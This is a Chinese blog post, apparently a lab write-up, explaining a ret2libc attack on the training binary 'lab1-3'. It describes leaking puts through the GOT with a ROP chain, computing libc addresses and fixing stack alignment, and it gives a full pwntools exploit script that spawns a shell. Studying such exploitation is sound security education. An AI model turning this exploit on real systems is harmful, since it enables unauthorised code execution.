@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="检查拿到Lab1-3，直接checksec：  还是开启了NX保护 运行我们可以看到，这次的运行和Lab1-2可谓一模一样  分析既然一模一样，那么我们能不能使用和Lab1-2一样的方法呢？通过前面实验的分析我们已经知道，只需要在是否修改的回答里，使用字符串覆盖长度，就可以注入任意长的字符，我们顺着思路往下走，回想Lab1-2中，我们要做的是先找到pop rax，pop rdi等指令的地址，还需要">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="16-ret2libc">
+<meta property="og:url" content="http://yoursite.com/2021/09/04/16-ret2libc/index.html">
+<meta property="og:site_name" content="Jameci&#39;s Blog">
+<meta property="og:description" content="检查拿到Lab1-3，直接checksec：  还是开启了NX保护 运行我们可以看到，这次的运行和Lab1-2可谓一模一样  分析既然一模一样，那么我们能不能使用和Lab1-2一样的方法呢？通过前面实验的分析我们已经知道，只需要在是否修改的回答里，使用字符串覆盖长度，就可以注入任意长的字符，我们顺着思路往下走，回想Lab1-2中，我们要做的是先找到pop rax，pop rdi等指令的地址，还需要">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/0.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/1.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/2.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/3.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/4.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/5.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/6.png">
+<meta property="og:image" content="http://yoursite.com/images/16-ret2libc/7.png">
+<meta property="og:updated_time" content="2021-09-05T09:49:10.481Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="16-ret2libc">
+<meta name="twitter:description" content="检查拿到Lab1-3，直接checksec：  还是开启了NX保护 运行我们可以看到，这次的运行和Lab1-2可谓一模一样  分析既然一模一样，那么我们能不能使用和Lab1-2一样的方法呢？通过前面实验的分析我们已经知道，只需要在是否修改的回答里，使用字符串覆盖长度，就可以注入任意长的字符，我们顺着思路往下走，回想Lab1-2中，我们要做的是先找到pop rax，pop rdi等指令的地址，还需要">
+<meta name="twitter:image" content="http://yoursite.com/images/16-ret2libc/0.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/09/04/16-ret2libc/">
+
+
+
+
+
+  <title>16-ret2libc | Jameci's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jameci's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">天下雷行，物与无妄。先王以茂对时，育万物。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/09/04/16-ret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jameci">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jameci's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">16-ret2libc</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-09-04T12:14:06+08:00">
+                2021-09-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h1><p>拿到Lab1-3，直接checksec：</p>
+<p><img src="/images/16-ret2libc/0.png" alt></p>
+<p>还是开启了NX保护</p>
+<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><p>我们可以看到，这次的运行和Lab1-2可谓一模一样</p>
+<p><img src="/images/16-ret2libc/1.png" alt></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>既然一模一样，那么我们能不能使用和Lab1-2一样的方法呢？通过前面实验的分析我们已经知道，只需要在是否修改的回答里，使用字符串覆盖长度，就可以注入任意长的字符，我们顺着思路往下走，回想Lab1-2中，我们要做的是先找到pop rax，pop rdi等指令的地址，还需要找到syscall和”/bin/sh”的地址，但我们这次会发现，源程序中这些指令已经找不齐了：</p>
+<p><img src="/images/16-ret2libc/2.png" alt></p>
+<p>这是什么原因呢？原理就在编译方式上，这次的程序是动态编译的，不像上次，很多库中的指令都被加载到了程序中。那么，我们在程序中使用的system，printf等函数，都会被存放在系统的一个大的动态链接库里，它们的代码并不写入程序，所以这次很多代码就找不到了</p>
+<p>那么我们怎么实现攻击呢？</p>
+<p>这里，我们就用到了ret2libc的思路，ret2libc，顾名思义，就是返回系统库执行。我们知道，在linux的系统库中，是存在system函数和”/bin/sh”字符串的。那么我们只需要把系统库里的”/bin/sh”地址传给rdi，然后call系统库里的system函数，就能够拿到shell了</p>
+<p>但问题又来了，我们怎么知道系统库里面这些东西的地址呢？</p>
+<p>回想其lab1-1，我们使用了gdb里面的p命令打印了system的地址，我们尝试用同样的方法去打印lab1-3中的system地址：</p>
+<p><img src="/images/16-ret2libc/3.png" alt></p>
+<p>这是因为lab1-3并没有使用system，因此system在代码中找不到，所以，我们必须另辟蹊径</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>使用ldd+程序名这个命令来查看libc库：</p>
+<p><img src="/images/16-ret2libc/4.png" alt></p>
+<p>可见使用的是libc.so.6库</p>
+<p>尽管我们不知道system的地址，但我们知道它一定在libc库里面，库中任意两个函数或其它东西直接的偏移都是固定的，我们只需要泄露库中某个函数的地址，就可以通过计算偏移找到system和”/bin/sh”的地址</p>
+<p>我们知道，函数的真实地址存放在got表中，如果我们能够泄露got表的内容，就可以得到特定函数的地址</p>
+<p>怎么泄露got表内容呢？我们只需要调用puts函数，再把got表相应位置的地址当做puts的参数，puts就会输出相应位置的内容了</p>
+<p>如何调用puts函数呢？我们只需要像上次lab1-2中一样，构造rop链</p>
+<p>我们不妨就让puts泄露自己的地址</p>
+<p>需要注意的是，调用puts函数需要使用plt表中puts的地址，而泄露地址则需要got表中的内容</p>
+<p>这些都可以通过pwntools的模块方便的实现：</p>
+<ul>
+<li><p>ELF模块可以绑定我们的二进制文件或库</p>
+</li>
+<li><p>ELF.got和ELF.plt分别可以查找got表和plt表</p>
+</li>
+<li><p>ELF.sym可以查询对应符号的位置</p>
+</li>
+<li><p>next(libc.search(b”/bin/sh”))可以找到’/bin/sh’</p>
+</li>
+</ul>
+<p>注意，为了拿到地址，我们必须让输入结束，这样，我们就没有机会继续注入system和’/bin/sh/‘了，因此，我们需要在rop链的底端，再让程序重新跳转会read，第二次读入</p>
+<p>第二次读入的地址可以选在getlens的上面，这样方便再次覆盖长度，这个地址从ida里找到</p>
+<p>我们为了给puts函数传递参数，还需要找到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure>
+<p>的地址，可以参考上次，使用ROPgadget找到</p>
+<p>第一次读入的rop链示意图：</p>
+<p><img src="/images/16-ret2libc/5.png" alt></p>
+<p>第二次读入的示意图：</p>
+<p><img src="/images/16-ret2libc/6.png" alt></p>
+<p><strong>但这时，本该拿到shell的脚本却出错了</strong></p>
+<p>原因在哪儿呢？我们使用gdb来调试，发现在一条名为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movhps  xmm0, [rsp+198h+var_190]</span><br></pre></td></tr></table></figure>
+<p>的指令上出错，原因就是xmm0是一个128位寄存器，对其赋值时，必须取地址能被128整除的位置才行</p>
+<p>我们第二次读入shellcode并执行时，恰巧栈没有128位对齐，也就是执行这条指令时，取数的地址末位不是0，那怎么办呢？我们知道64位系统的栈帧都是64位对齐的，对齐了64位却没有对齐128位只有一种情况，那就是末位是8，所以，我们只需要在第二次注入shellcode的时候，多注入一个空的ret指令，让栈多跳转一次，就能够在执行这条指令的时候让栈的末尾是0了</p>
+<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./lab1-3'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"length:"</span>, <span class="string">b'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Need to modify?(y/n)"</span>, <span class="string">b'a'</span> * <span class="number">8</span> + <span class="string">b'~'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./lab1-3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">main_addr = <span class="number">0x400805</span></span><br><span class="line"><span class="comment"># ret_addr = 0x400805</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008e3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(hex(puts_got))</span></span><br><span class="line"></span><br><span class="line">padding = <span class="string">b'a'</span> * (<span class="number">48</span> + <span class="number">8</span>)</span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"# "</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(sh.recv(<span class="number">6</span>) + <span class="string">b"\x00\x00"</span>)</span><br><span class="line"><span class="comment"># print(hex(puts_real_addr))</span></span><br><span class="line"></span><br><span class="line">base_addr = puts_real_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">system_addr = base_addr + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = base_addr + next(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line">ret_addr = <span class="number">0x400576</span></span><br><span class="line"></span><br><span class="line">payload = padding</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"><span class="comment"># payload += p64(ret_addr)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"length:"</span>, <span class="string">b'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">"Need to modify?(y/n)"</span>, <span class="string">b'a'</span> * <span class="number">8</span> + <span class="string">b'~'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">"# "</span>, payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="/images/16-ret2libc/7.png" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/09/03/15-ret2syscall/" rel="next" title="15-ret2syscall">
+                <i class="fa fa-chevron-left"></i> 15-ret2syscall
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/09/05/17-栈迁移/" rel="prev" title="17-栈迁移">
+                17-栈迁移 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Jameci</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">258</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#检查"><span class="nav-number">1.</span> <span class="nav-text">检查</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#运行"><span class="nav-number">2.</span> <span class="nav-text">运行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#思路"><span class="nav-number">4.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本"><span class="nav-number">5.</span> <span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#结果"><span class="nav-number">6.</span> <span class="nav-text">结果</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jameci</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
